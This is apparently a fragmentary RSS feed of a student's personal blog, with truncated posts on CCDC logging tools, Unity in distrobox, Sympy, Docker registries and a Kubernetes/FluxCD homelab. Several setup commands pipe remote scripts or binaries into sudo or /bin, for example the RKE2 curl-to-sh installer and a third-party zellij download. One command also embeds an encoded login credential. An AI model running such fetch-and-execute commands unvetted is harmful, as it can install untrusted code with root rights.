<p>Day 3:</p>
<p>For lunch, I went to the food place they had in the exhibition hall. I had a chicken sandwich, and fries, and it was actually pretty good. Here’s a picture:</p>
<p><img src="./blog/scale-22/images/chickensandwich.jpg" class="img-fluid"></p>
<p>For dinner, I went to El Cholo. I also forgot to take a picture, but I talked a ton with the Nix people. It was also pretty good.</p>
<p>Day 4:</p>
<p>For lunch, I had the same chicken sandwich I had yesterday. For dinner, I had sweet and sour chicken at Gmo’s, the Cal State Northridge campus eatery.</p>

  <description><![CDATA[ 





<p>For the Layer8 Cybersecurity club here at Cal State Northridge, and potentially more clubs, I will do a presentation on how I set up my site with Github pages, and how to set up your own site the same way.</p>
<p>This guide uses Github Actions to autodeploy, so all users need to do is commit from the web interface of Github, their site will automatically render changes.</p>
<p>Below is the same presentation, rendered to html with the slide titles as headers.</p>
<p>If you want to see the presentation in slides form, click the “RevealJS” format on the right, under “Other formats”.</p>
<p>Here is a qr code to the slides:</p>
<div id="qrcode" class="qrcode"></div>

  <title>Alternatives to Dockerhub</title>
  <link>./blog/docker-registry/</link>
  <description><![CDATA[ 





<p>Recently, <a href="https://docs.docker.com/docker-hub/usage/">Docker Hub</a>, is setting up rate limit. Unauthenticated users will be limited to 10 pulls per hour, and authenticated users will be limited to 100 pulls per hour.</p>
<p>This could cause issues with setups like CGNAT, and is a very arbitrary image</p>
<p>So, I looked for some alternatives.</p>
<section id="other-public-registries" class="level1">

<details>
<summary>
Why not a self hosted registry and building our own containers?
</summary>
<p>Most people don’t care about these, instead opting for local builds and registries, but for the <a href="https://wrccdc.org/">CCDC</a> competition, there will be a firewall with an allowlist. It’s easier to ask for a container registry to be unblocked, because container builds will get from so many different websites. In addition to that, we are not allowed to use anything that requires a login, and I do not know if that applies to Docker Hub.</p>

  <title>Logging solutions for CCDC</title>
  <link>./playground/ccdc-logs/</link>
  <description><![CDATA[ 





<section id="intro" class="level1">
<h1>Intro</h1>
<p>At Cal State Northridge, I am part of a team that participates in the <a href="https://wrccdc.org/">wrccdc</a> cybersecurity competiion. It’s a blue team competition, that involves securing machines, but also writing “incident responses” when machines are hacked.</p>
<p>In order to write a good incident response, you need, at minimum, the timestamp, what was done, the user, and the ip address. If you do write a good incident response, then you can get up to half of the points you lost from getting hacked back.</p>
<p>In order to collect and save this information, we need some kind of logging solution, that we can search and extract data from.</p>
</section>
<section id="promising-options" class="level1">
<h1>Promising Options</h1>
<p>https://datalust.co/pricing https://github.com/librenms/docker#syslog-ng-container https://corelight.com/ https://en.wikipedia.org/wiki/Zeek https://malcolm.fyi/ https://docs.zeek.org/en/master/about.html#what-is-zeek https://github.com/aquasecurity/tracee https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</p>
</section>
<section id="central-logging-server" class="level1">
<h1>Central Logging Server</h1>
<p>Firstly, we need some kind of central logging server. I really like options like <a href="https://graylog.org/">graylog</a>, or even better is <a href="https://wazuh.com">wazuh</a>, which is a full “Endpoint Defense System” (EDR), which collects data with a security focus and lets you search it.</p>
<p>However, both of those options have a big downside, which is that the underlying software they use, Elasticsearch, Logtash, and Kibana (ELK stack) are very resource intensive, and somewhat unsuitable for every competition machine.</p>
<section id="zinc" class="level2">
<h2 class="anchored" data-anchor-id="zinc">Zinc</h2>
<p><a href="https://github.com/zincsearch/zincsearch">Zinc</a> is the most promising option. It is a super lightweight version of Elasticsearch and Kibana, and boasts a compatible API (although I think we won’t need that right now).</p>
<p>The <a href="https://zincsearch-docs.zinc.dev/">documentation</a> is excellent, and deployment is easy:</p>
<p>From the <a href="https://zincsearch-docs.zinc.dev/quickstart/">quickstart</a></p>
<pre><code>docker run -v /full/path/of/data:/data -e ZINC_DATA_PATH="/data" -p 4080:4080 \
    -e ZINC_FIRST_ADMIN_USER=admin -e ZINC_FIRST_ADMIN_PASSWORD=Complexpass#123 \
    --name zincsearch public.ecr.aws/zinclabs/zincsearch:latest</code></pre>
<p>Another important thing is <a href="https://zincsearch-docs.zinc.dev/ingestion/">log ingestion</a>. Although I don’t recognize most of the options there, I do recognize <a href="https://www.syslog-ng.com/community/b/blog/posts/another-use-for-the-syslog-ng-elasticsearch-http-destination-zinc">syslog</a>, which is a general protocol for forwarding logs around. However, this setup seems to require syslog-ng 2.32 or newer, which is <a href="https://repology.org/project/syslog-ng/versions">not available on all operating systems</a>.</p>
<p>Perhaps this software could be used in combination with fluentd, which can intake <a href="https://docs.fluentd.org/input/syslog">syslog</a> and output it to an <a href="https://docs.fluentd.org/output/elasticsearch">elasticsearch</a> source.</p>
<details>
<summary>
Expand/Collapse Testing
</summary>
<p>I spun up a podman container with:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">podman run -it --rm -p 4080:4080 -e ZINC_FIRST_ADMIN_USER=admin -e ZINC_FIRST_ADMIN_PASSWORD=password public.ecr.aws/zinclabs/zincsearch:latest</span></code></pre></div>
<p>And it was up instantly:</p>
<p><img src="./playground/ccdc-logs/images/zincsearch.jpg" class="img-fluid"></p>
</details>
</section>
<section id="openobserve" class="level2">
<h2 class="anchored" data-anchor-id="openobserve">OpenObserve</h2>
<p><a href="https://openobserve.ai/">Openobsever</a> is similar to Zinc, a lightweight alterntive to an Elasticsearch. It also seems to be able to <a href="https://openobserve.ai/docs/ingestion/logs/syslog/">ingest syslogs directly</a>.</p>
<p>They also seem to have a <a href="https://openobserve.ai/docs/quickstart/#__tabbed_1_3">docker quickstart</a>.</p>
<details>
<summary>
Expand/Collapse testing

<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">podman run -e ZO_DATA_DIR="/data" --network=host -e ZO_ROOT_USER_EMAIL="root@example.com" -e ZO_ROOT_USER_PASSWORD="password" docker.io/openobserve/openobserve:latest</span></code></pre></div>
<p>Similar to Zinc (I think they’re by the same people), it comes up very quickly.</p>
<p><img src="./playground/ccdc-logs/images/openobserver.jpg" class="img-fluid"></p>
<p>It also seems to come with script which I can run on Linux or Windows machines, that will install an agent to ingest logs.</p>
<p>I spun up a debian vagrant machine as a test, so I can run the command.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">curl -O https://raw.githubusercontent.com/openobserve/agents/main/linux/install.sh &amp;&amp; chmod +x install.sh &amp;&amp; sudo ./install.sh http://192.168.121.1:5080/api/default/ cm9vdEBleGFtcGxlLmNvbTpzWlAyMXF1VFpCQmFpa3hp</span></code></pre></div>
<p>Although I love the ease of install, the search interface is unintuitive, and it doesn’t seem to log anything other than this one bit about the logging process itself.</p>
<p><img src="./playground/ccdc-logs/images/openobserverlogs.jpg" class="img-fluid"></p>
<p>Well, there also seems to be a “default” cateogry, which informs me of apt upgrades but not much else.</p>
<p>I attempted to install SysmonForLinux, but the logs that generates don’t seem to be forwarded by default. It seems like the OpenObserve agent catches journald and apt logs, but not actual syslogs.</p>
<p>I can forward syslogs though, <a href="https://openobserve.ai/docs/ingestion/logs/syslog/">by having openobserve act as a syslog server</a></p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">apt install rsyslog</span></code></pre></div>
<p><a href="https://wiki.archlinux.org/title/Rsyslog#journald's_syslog-forward_feature">Forward journald messages to syslog</a>, and then I could <a href="https://www.rsyslog.com/sending-messages-to-a-remote-syslog-server/">forward syslog messages to a remote server using rsyslog</a>.</p>
<p>And for a brief period, logs were working, but then they deleted themselves and I can no longer search for them. The issue seems to be somehow related to SysmonForLinux, because after disabling that, it works.</p>

<section id="signoz" class="level2">
<h2 class="anchored" data-anchor-id="signoz">Signoz</h2>
<p><a href="https://signoz.io/docs/">Signoz</a> is another FOSS central logging service.</p>
<p>It can <a href="https://signoz.io/docs/userguide/collecting_syslogs/">collect syslogs</a></p>

<p>With Linux, there are two ways to do log collection that are superior: Hooking into the kernel and listening to syscalls/file interactions, or epbf which can do something similar. Other, polling based solutions for logging, may not work because they may be too slow and miss events, and they may not offer the performance we need.</p>
<section id="falco" class="level3">
<h3 class="anchored" data-anchor-id="falco">Falco</h3>
<p><a href="https://falco.org/">Falco</a> is a security solution that works by collecting logs and forwarding them</p>
<p>What I really like about Falco, is the fact that it can be <a href="https://falco.org/docs/setup/container/">deployed as a container</a>, yet it still hooks into the host system and collects logs.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">docker pull falcosecurity/falco:latest</span>

<p>In addition to that, it can forward it’s collected logs to <a href="https://falco.org/docs/concepts/outputs/forwarding/">elasticsearch, zincsearch, or syslog</a>.</p>

<p><a href="https://github.com/microsoft/SysmonForLinux">SysmonForLinux</a> is a (now) Microsoft project that brings sysmon to Linux. It also seems to output to syslog by default.</p>

</summary>
<p>Installing it was simple, I followed the <a href="https://github.com/microsoft/SysmonForLinux/blob/main/INSTALL.md">install instructions for Debian 12</a>.</p>
<p>Then, I started the service.</p>
<p>To view the syslogs, I can use:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">cat /var/log/syslog | /opt/sysmon/sysmonLogView | less</span></code></pre></div>

  <title>Free resources to learn various things</title>
  <link>./guides/learn-linux/</link>
  <description><![CDATA[ 





<p>I’m in college now, and one of my frustrations is the usage of textbooks I cannot reshare or reference once I am done with the class. In my opinion, one of the goals of college is not just to learn things, or learn how to learn, but also to learn how to teach things. It’s because of this, that I usually try to find alternate sources for the information taught in the classes, that I can reference</p>
<p>I have a heavy preference for Free and Open Source resources, because I believe that things like wikibooks will be much more resilient in the long run, and stay up. I’ve seen similar lists of learning, and it is frustrating when I’m no longer able to buy or view one of the textbooks on the list.</p>
<p>I also like resources maintained by some kind of organization, either the official organzition behind the software (think Microsoft and powershell), or a nonprofit, (Overthewire), because again, I think they will be more resilient in the long run.</p>
<p>I try to avoid video or audio resources, because of unclear copyright, and because they are difficult to reference on the go.</p>
<p>The idea behind this list is that I should be able to pull it up on my phone, and show specific things to people.f</p>

<h1>Linux</h1>

<ul>
<li>This is definitely one of my favorites. They mention that they don’t have a free server for people to work with. However, many of the cloud providers offer 1 year’s worth of credit’s for a free server. Most notably, Oracle has an always free tier, which offers a very small server. I recommend this, because you don’t have to give up your credit/debit card information (dealing with cloud provider pricing can be… difficult), although Oracle has been known to randomly delete people on the “Truly Free” (no credit card) tier, to make room for paying customers.

</ul>
<p><a href="https://overthewire.org/wargames/bandit/">OverTheWire Bandit</a></p>
<ul>
<li>OverTheWire Bandit is a bit different from the other resources on this list. When I first used it, both personally and as a teaching tool, I was frustrated, because some of the commands it makes you use, will probably never show up in a real world usecase. I was frustrated with it’s “trickyness”, but I now realize the point of overthewire isn’t to teach commands, but to teach reading the manual. The answer to every challenge they give can be found in <a href="https://en.wikipedia.org/wiki/Man_page">manpages</a>, the built in Linux documentation.</li>

  <title>Installing Unity on Distrobox</title>
  <link>./guides/unity-distrobox/</link>
  <description><![CDATA[ 





<p>First, begin with installing distrobox and podman, on your respective distro.</p>
<p>Here’s how to do it one some of the major distros:</p>
<pre><code>pacman -Syu distrobox podman</code></pre>
<pre><code>apt update &amp;&amp; apt install -y distrobox podman</code></pre>
<pre><code>dnf install distrobox podman</code></pre>
<p>Then, create an Ubuntu 22.04 container, since that is what Unity officially supports.</p>
<p><code>distrobox create --image docker.io/library/ubuntu:22.04 --name unity</code></p>
<p>Then, you can enter the container:</p>
<p>`<code>distrobox enter unity</code></p>
<p>From here, follow the steps on <a href="https://docs.unity3d.com/hub/manual/InstallHub.html">Unity’s official site</a>:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">wget -qO - https://hub.unity3d.com/linux/keys/public | gpg --dearmor | sudo tee /usr/share/keyrings/Unity_Technologies_ApS.gpg &gt; /dev/null</span></code></pre></div>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">sudo sh -c 'echo "deb [signed-by=/usr/share/keyrings/Unity_Technologies_ApS.gpg] https://hub.unity3d.com/linux/repos/deb stable main" &gt; /etc/apt/sources.list.d/unityhub.list'</span></code></pre></div>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">sudo apt update &amp;&amp; sudo apt install unityhub</span></code></pre></div>
<p>After this, install Microsoft VSCode using <a href="https://code.visualstudio.com/docs/setup/linux">their official steps</a></p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">sudo apt-get install wget gpg apt-transport-https</span></code></pre></div>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" |sudo tee /etc/apt/sources.list.d/vscode.list &gt; /dev/null</span></code></pre></div>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">rm -f packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">sudo apt update &amp;&amp; sudo apt install code -y</span></code></pre></div>
<p>Since we are doing unity development, we will also need <code>dotnet-sdk-8.0</code>, and <code>git</code></p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">sudo apt install dotnet-sdk-8.0 git</span></code></pre></div>
<section id="vscode-configuration" class="level1">
<h1>VSCode Configuration</h1>
<p>There are several extensions that significantly enhance the C#, .NET, and Unity development experience.</p>
<p><code>ms-dotnettools.csharp</code> — This is Microsoft’s C# and .NET extension, and it will pull a few extensions as a dependency.</p>
<p><code>VisualStudioToolsForUnity.vstuc</code> — This is Microsoft’s official Unity extension.</p>
</section>
<section id="logging-into-unity-hub" class="level1">
<h1>Logging into Unity Hub</h1>
<p>This process can be somewhat difficult, as Unity Hub will not show up on the desktop.</p>
<p>And for some reason, I needed flatpak on my host system (or more likely, one of it’s dependencies).</p>
<p><code>sudo pacman -Syu flatpak</code> — or however your distro will install flatpak.</p>
<p>First, launch unity in the container.</p>
<pre><code>distrobox enter unity</code></pre>
<pre><code>unityhub</code></pre>
<p>Then, click the login button. A browser will be opened, asking you to login. However, you will not automatically be redirected to Unity Hub, from that page, you have to do it manually.</p>
<p>Copy the link on the bottom right. And then, in another distrobox session (Unity Hub must still be running for this to work)</p>
<pre><code>unityhub [copied link]</code></pre>
<p>If you need to install a specific version of Unity not available in the Unity Hub, this is a similar process. Go to <a href="https://unity.com/releases/editor/archive">Unity’s release archive</a>, find the relevant link, and then copy the install link, and paste it like above.</p>
</section>
<section id="misc" class="level1">
<h1>Misc</h1>
<p>One thing I like to do is use <a href="https://zellij.dev/">Zellij</a> as a terminal multiplexer</p>
<pre><code>cd /bin

sudo wget https://bin.ajam.dev/x86_64_Linux/zellij

sudo chmod +x zellij

zellij</code></pre>

  <title>Sympy Gamma, my favorite WolframAlpha alternative</title>
  <link>./guides/sympy/</link>
  <description><![CDATA[ 





<section id="intro" class="level1">
<h1>Intro</h1>
<p>Many people know about Wolfram Alpha for it’s powerful ability to give step by step solutions to calculus problems… but only if you pay.</p>
<p>Because of this, I use a free (both as in beer, and as in freedom) alternative, called <a href="https://gamma.sympy.org/">Sympy Gamma</a>. The source code is <a href="https://github.com/sympy/sympy_gamma">on github</a>.</p>
<p><img src="./guides/sympy/images/parts.jpeg" class="img-fluid"></p>
<p>It can also do partial fraction decomposition, trig subsitution, and more.</p>
<p>The step by step solutions, work by several special functions, that attempt to mimic how a student would solve a problem.</p>
</section>
<section id="location" class="level1">
<h1>Location:</h1>
<p>There are two urls:</p>
<p><a href="sympygamma.com">sympygamma.com</a></p>
<p><a href="gamma.sympy.org">gamma.sympy.org</a></p>
<p>As far as I can tell, these are two different instances of Sympy Gamma, with different rate limits.</p>
<p>Also, if you use the duckduckgo bang !sympy, then it inputs a function into <a href="sympygamma.com">sympygamma.com</a>.</p>
<p>There is also <a href="https://sympy-beta.vercel.app/">Sympy Beta</a> (<a href="https://github.com/eagleoflqj/sympy_beta">Source code</a>), which is a version of sympy ported to work entirely in the local browser, using Pyodide and webassembly. I’ve found that it manages to succeed where Sympy Gamma fails, and it also gets around rate limits since it works locally. In addition to that, Sympy Beta is a progressive web app, meaning it works offline after you open it in your browser once.</p>
<p>After some testing, I actually think I like Sympy Beta better, because of the reasons mentioned above, and some failures of Gamma mentioned below. In addition to that, I could not figure out how to self host Sympy Gamma, as the docker compose would not work. However, Sympy Beta seems to be a simpler, all in one NPM application.</p>
</section>
<section id="functions" class="level1">
<h1>Functions</h1>
<p>Below are some of the functions I use commmonly, but really, you can use anything from python and the sympy library.</p>
<p>For most functions, the form is something like <code>function(arguments)</code> with the arguments in parenthesis. <em>Some</em> natural lanugage works in Sympy Beta, but it’s better to just use the python syntax.</p>
<section id="calculus" class="level2">
<h2 class="anchored" data-anchor-id="calculus">Calculus</h2>
<p><a href="https://docs.sympy.org/latest/modules/integrals/integrals.html">integrate()</a> — also, if you use this function with sympy gamma, it will give you the step by step solution! Most of the time. It sometimes fails, either because sympy can’t figure it out or due to rate limits.</p>
<p>For example, the partial fractions decomposition step-by-step solutions don’t often show up on Sympy Gamma, and are somewhat obfuscated on Sympy Beta. Sympy Beta often offers multiple solutions as well, with some of them not being partial fraction decomposition. I think the Sympy manual integrate function doesn’t have an explicit rule to do partial fractions decomposition.</p>

<p><a href="https://docs.sympy.org/latest/modules/plotting.html#sympy.plotting.plot.plot">plot(f(x))</a> — plots a function, and shows the graph.</p>
<p><a href="https://docs.sympy.org/latest/modules/concrete.html#sympy.concrete.summations.summation">summation(f(x), (x, bottom, top))</a> — do a sum. Have top be <code>oo</code> for an infinite sum. Also, on sympy gamma, appending <code>.doit()</code> to this function gives me more information with finite sums.</p>
<p><a href="https://docs.sympy.org/latest/modules/core.html#sympy.core.expr.Expr.series">series(f(x), x, around, numofterms)</a> — compute a Taylor Series, around “around”, with up to “numofterms” terms. It should be noted that after it computes “goto” terms, it will combine like enough terms, leaving you with less terms than you may have wanted.</p>
<p><code>help(function)</code> — this function shows you the documentation of any function. This is a built in function into python.</p>
<p>There are many, many more functions, and they can be found on the <a href="https://docs.sympy.org/latest/index.html">sympy documentation</a>.</p>

<h1>Linear Algebra</h1>
<p>Firstly, these matrix operations only seem to work on <a href="https://sympy-beta.vercel.app/">Sympy Beta</a>.</p>
<p><code>Matrix([[0, 0, 0], [0, 0, 0]])</code> creates a matrix with 2 rows and 3 columns.</p>
<p>This can be used in other functions, like <code>rref</code>, to get the reduced row echelon form.</p>
<p><code>Matrix.rref(Matrix([[1, 1, 1], [1, 2, 3], [1, 2, 4]]))</code></p>
<p>You can even solve for abitrary constants using <code>a</code>, <code>b</code>, and <code>c</code></p>

<section id="keywords-and-variables" class="level1">
<h1>Keywords and Variables</h1>
<p>It’s not like a normal calculator. Sympy is a Python library, meaning everything is designed to be code first. Since it isn’t really good practice to put special symbols like “π” in code, there are alternative, purely text values that you can use to refer to the value of pi, infinity, or <em>e</em>.</p>
<p><code>oo</code> = infinity. Yes, that is two o’s put togetheer.</p>
<p><code>E</code> = <em>e</em>. It should be noted that lowercase e does not work.</p>
<p><code>pi</code> = π. The classic pi, 3.1415…</p>

  <title>Build Server 5 — Kubernetes, GitOps, FluxCD</title>
  <link>./projects/build-server-5/</link>
  <description><![CDATA[ 





<section id="failure-and-whats-next" class="level1">
<h1>Failure and What’s Next</h1>
<p>I wanted a custom solution that used FluxCD to deploy Openstack, since I wanted my entire setup, inclduing Openstack, to be tracked in a Git repo (GitOps).</p>
<blockquote class="blockquote">
<p><a href="https://docs.starlingx.io/system_configuration/index-sysconf-d511820651f0.html#starlingx-openstack">StarlingX OpenStack is installed and managed as an FluxCD application.</a></p>
</blockquote>
<p>Now, StarlingX, sadly, is not GitOps OpenStack. Configurations to the OpenStack application are done via the command line, or via helm value files. Perhaps I can clone the flux repo they use, but truthfully, I’m not going to worry about it for now.</p>
<p>I would like an OpenStack deployment up shortly, and while this project is fun (and definitely possible it seems), it is taking too long.</p>
</section>
<section id="background-goals" class="level1">
<h1>Background &amp; Goals</h1>
<p>Since I got literally no work done on my server, I think it would be prudent to scale down. Rather than opting for a larger option.</p>
<p>In the order I want, here are concrete goals:</p>
<ul>
<li>Syncthing: (I need this in order to sync files between my two laptops)</li>
<li>Oauth2/Openid/Ldap (Kanidm or Authentik)
<ul>
<li>I might switch to <a href="https://kanidm.com/">Kanidm</a> from authentik as my authentication server, as it seems a lot simpler… but it doesn’t seem to support invites</li>
</ul></li>
<li>Virtual Machine host with a web UI that I can give out to others. I’m currently looking at Incus or Ovirt.</li>
</ul>
<p>I recently learned that <a href="https://www.ovirt.org/">Ovirt</a> was still maintained, and it seems to be feature complete. It contains every feature I want, like oauth2 authentication, port security, and a web UI. Although, due to Red Hat abandoning the project, it likely wont’ get beyond feature updates, and instead just get bug and security updates, the software does what I want it to do.</p>
</section>
<section id="software-selection" class="level1">
<h1>Software Selection</h1>
<section id="virtual-machine-manager" class="level2">
<h2 class="anchored" data-anchor-id="virtual-machine-manager">Virtual Machine Manager</h2>
<p>Incus: * <a href="">Authentication</a> - Openid connection * <a href="https://linuxcontainers.org/incus/docs/main/authorization/">Authorization</a> - Openfga authorization - Do I have to create a project for each user? (seems to be no… <a href="https://linuxcontainers.org/incus/docs/main/howto/projects_confine/#confine-projects-to-specific-incus-users">Incus can be configured to dynamically create projects for all users in a specific user group</a>) - What is the difference between the varios levels of authority * <a href="https://linuxcontainers.org/incus/docs/main/explanation/security/#network-security">Port security</a> - Can be overrided on a per instance basis… but how can I make this an unchangable default?</p>

<p>So, Incus is only packaged in <a href="https://backports.debian.org/Instructions/">Debian backports</a>. The first step is to add those. After that, <code>apt update</code>, <code>apt upgrade</code> and <code>apt install incus-tools incus incus-agent incus-client</code>.</p>

</section>
<section id="rke2-try-2" class="level1">
<h1>RKE2 Try 2</h1>
<p>I uninstalled RKE2, but I want to redeploy my services on it again.</p>
<p><a href="https://docs.rke2.io/install/quickstart">Quick start guide</a></p>
<p><code>curl -sfL https://get.rke2.io | sudo sh -</code> (for some reason it crashed and didn’t start when I ran it in a root machinectl session)</p>
<p>I then copied over <code>/etc/rancher/rke2/rke2.yaml</code> to <code>~/.kube/config</code> on my local machine, in order to configure kubernetes from my local machine.</p>
<section id="dynamic-ip-issues" class="level2">
<h2 class="anchored" data-anchor-id="dynamic-ip-issues">Dynamic IP Issues</h2>
<p>So apparently kubernetes, by default, can’t handle dynamic ip addressed. It crashes when I attempt to start it, because my ip address changed.</p>
<p>At the same time, my <a href="https://hub.docker.com/r/qmcgaw/ddns-updater">dynamic dns updater</a> stopped working. I think it’s because the porkbun API changed, but my container did not update, as I did not have container auto update enabled. (1/28/2025)</p>
<p>So it’s clear that dynamic ip/dns must be done from <em>inside</em> kubernetes. But it looks like <a href="https://docs.k3s.io/networking/distributed-multicloud?_highlight=dynamic#embedded-k3s-multicloud-solution">rke2/k3s</a> doesn’t have much support for dynamically changing ip addresses, instead requiring you to manually change it via a command line flag. <a href="https://stackoverflow.com/questions/49249712/how-to-make-kubernetes-work-with-dynamic-ip-address">Another stackoverflow post</a> claims that there is no way to do DNS, but a <a href="https://github.com/kubernetes/kubernetes/pull/62314#discussion_r181482584">github issue</a> says that the function that the stackoverflow post is referencing is not used except beyond generating <code>.kubeconfigs</code>.</p>
<p>I also found <a href="https://cdcloudlogix.com/ddclient-on-kubernetes/">1</a>, <a href="https://www.lachlanlife.net/posts/2022-11-dynamic-dns/">2</a>, <a href="https://codeburst.io/ddclient-c9a6ac1d8f81">3</a> sources on using dynamic DNS, but they all work by assigning having the server behind a router, where the server itself doesn’t have dynamic ip address.</p>
<p>However, there is something interesting: My server’s main ethernet port retains the same IP addresss it started with. This issue was caused by NetworkManager attempting to give my weird veth setup an ip address, which the rest of services on the server began to think that was the server’s main ip address. I am considering simply not handling the fact that Kubernetes cannot handle dynamic ip addresses, since my server seems to get a constant ip address.</p>
<p>I do, however, have to fix dynamic dns. The issue was that the <a href="https://hub.docker.com/r/qmcgaw/ddns-updater">dynamic dns updater</a> container did not auto update, and I need to fix that with podman.</p>
<p>But taking a quick look at the <a href="https://docs.podman.io/en/latest/markdown/podman-auto-update.1.html">relevant docs</a>, it seems like podman only supports auto updates in the background if a systemd quadlet is used. Debian Linux does not have recent enough version of podman to have this feature.</p>
<p>Wait, I just realized that I don’t actually need dynamic DNS. Since my IP address will not change, I can just not bother with this.</p>
</section>
<section id="fluxcd" class="level2">
<h2 class="anchored" data-anchor-id="fluxcd">FluxCD</h2>
<p>Now, I also realized that git can work over ssh. So I have a git repo, called <code>fleet-charts</code>, located on my server, which I will access from my laptop via ssh.</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing/fleet-charts --branch=main --private-key-file=/home/moonpie/.ssh/moonstack</span>

<span id="cb1-5">✗ failed to clone repository: unable to clone: repository not found: git repository: 'ssh://moonpie@moonpiedumpl.ing/fleet-charts</span></code></pre></div>
<p>I find this odd, because ssh works normally:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">[moonpie@lizard vscode]$ ssh moonpie@moonpiedumpl.ing -i /home/moonpie/.ssh/moonstack</span>

<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing:22/home/moonpie/fleet-charts --branch=main --private-key-file=/home/moonpie/.ssh/moonstack --verbose</span>

<p>So it looks like I must use an absolute path, and cannot use “~” for relative patths. Or maybe I can use the <code>$HOME</code> environment variable.</p>
<p>But I actually don’t like this setup. I uninstalled flux, and I want to redeploy it, but wish ssh on a different port instead. I want port 22 on this server to be availble for the forgejo ssh service, rather than to be a the administrative ssh service. I’m going to change ssh to port <code>22022</code> in order to avoid conflicts with other services.</p>

<p>Another weird thing is that no changes were made to the git repo where I was tracking flux… but changes were made to my cluster. I thought the point of flux was that all state was in the git repo, but that doesn’t seem to be the case here.</p>
<p>Oh. Oops. RKE2 comes with an nginx controller already. I may have to remove that if I want traefik as an ingress controller.</p>

<p>I also changed the name of the git repo to <code>flux-config</code>.</p>
<p>I also realized that the <code>flux-system</code> repo is the configs of the flux-system namespace. Meaning, each directory <em>should</em> be a namespace? However, I don’t think I’m going to use many namespaces, they seem like extra complexity designed for multi-project or multi-user kubernetes clusters.</p>

<p>But… no changes were made to the git repo? I’m confused, as I thought the point of flux was that all changes would be version controlled.</p>

<p>So it seems I’m missing a “load balancer ingress IP address”.</p>
<p>I also find it odd that the relevant configs are not automatically added to the git repo. I decided to experiment with adding files to the git repo, rather than using the flux cli.</p>

<p>This actually deploys properly without errors, so it seems that the flux git repo organization is arbitrary and for the purposes of maknig it readable for humans, and is not actually necessary.</p>
<p>It probably doesn’t error because I have the <code>service: type: LoadBalancer</code>, but it doesn’t actually use any ports or seem to be deployed in a useful manner.</p>

<p>It seems that traefik comes with a load balancer type service, but it doesn’t actually get an external ip. Why?</p>
<p>After more research, it seems that a load balancer is actually needed in order to use a load balancer type service. On cloud instances, the cloud server acts as a load balancer and can do this. On bare metal instances, users are on their own. The most common deployment for a bare metal load balancer seems to be <a href="https://metallb.io/">metallb</a>, but that doesn’t really work for me, as I only have ONE ip address and it looks like metallb expects you to be able to ask for more on the spot somehow.</p>
<p>(well… technically, I can use dhcp to ask for more ip addresses, but it doesn’t look like metallb supports that use case, only something different)</p>
<p>Instead, I found <a href="https://docs.k3s.io/networking/networking-services?_highlight=ingress#service-load-balancer">klipper</a>. Klipper is an <em>extremely</em> simple load balancing service built into K3s — but disabled in RKE2 by default. All it does is use iptables/nftables to forward traffic from ports you want the load balancer to forward from, to inside the cluster.</p>
<p><a href="https://docs.rke2.io/networking/networking_services?_highlight=load#service-load-balancer">RKE2 can deply klipper by using an install flag</a>… and it seems, <strong>only</strong> via an install flag. There doesn’t seem to be another way to install klipper, no helm charts or anything… it seems to just be a bash script in a docker container.</p>
<p>So, it looks like I need to uninstall my cluster and redeploy it…</p>

<p>So, I used <code>systemctl edit rke2-server.service</code> to create an override file for the systemd service.</p>

